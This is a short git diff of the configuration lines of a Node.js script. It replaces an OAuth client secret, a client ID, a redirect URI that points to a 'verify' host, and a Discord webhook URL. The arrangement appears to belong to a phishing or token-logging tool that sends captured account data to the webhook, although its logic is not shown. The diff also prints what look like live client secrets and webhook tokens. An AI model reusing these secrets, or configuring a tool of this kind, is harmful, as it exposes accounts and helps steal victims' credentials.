@@ -1,8 +1,8 @@
 //Change these btw
-const client_secret = 'JQ68Q~aA2GbK3lPmlRyzreCfHaXTpXszqXLU3cTu' //you need to put the "Secret Value" here not the "Secret ID"!!!!
-const client_id = '1e286315-a0cf-4aca-8822-96f6b7f47297'
-const redirect_uri = 'https://verify-h8je.onrender.com'
-const webhook_url = 'https://discord.com/api/webhooks/1048927881016909925/BP_G-rNFa_l2hYZSZS-gHPe7dorSDNf7djILvAjmQ2W7iDsuhfXQd05KBnLaP1mB7t5c                             '
+const client_secret = 'ZOt8Q~BhXYURGXPRyo~9gXenE5n6nihv0tY2MaEV' //you need to put the "Secret Value" here not the "Secret ID"!!!!
+const client_id = 'f6c8cec0-549f-49f7-8072-01e14e32588f'
+const redirect_uri = ''
+const webhook_url = 'https://discord.com/api/webhooks/1091755356302098462/VYWXmLvCV9D-QGM-s-f1n8LyvUBy21sOQhDLxkafnhOGVhAp4mNB-XHmoZAklVorAEZt'
 
 //Requirements
 const axios = require('axios')
